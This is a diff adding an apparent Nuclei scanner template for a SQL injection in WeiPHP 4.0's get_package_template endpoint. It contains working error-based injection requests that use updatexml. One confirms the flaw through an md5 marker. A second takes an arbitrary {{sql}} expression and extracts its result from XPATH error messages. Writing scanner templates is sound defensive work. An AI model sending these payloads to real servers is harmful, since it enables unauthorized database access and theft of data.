@@ -1,0 +1,53 @@
+id: weiphp-sql-injection
+info:
+  name: WeiPHP 4.0 get_package_template SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    WeiPHP 4.0 has a SQL injection vulnerability in the get_package_template method. This can allow attackers to retrieve sensitive database information and potentially gain server access.
+  reference:
+    - https://www.weiphp.cn
+  classification:
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 8.0
+  tags: sql-injection
+
+http:
+  - raw:
+      - |
+        GET /index.php?s=home/addons/get_package_template&addons[0]=BETWEEN%20%27a&addons[1][]=%20AND%20null%20or%20updatexml(1,concat(0x7e,md5(123)),1)%23&is_stree=1 HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "202cb962ac59075b964b07152d234b7"
+
+  - raw:
+      - |
+        POST /index.php?s=home/addons/get_package_template&is_stree=1 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept: */*
+
+        addons[0]=BETWEEN 'a&addons[1][]= AND null or updatexml(1,concat(0x7e,{{sql}}),1)%23
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "XPATH"
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "XPATH syntax error: '~(.*)'"
+        group: 1
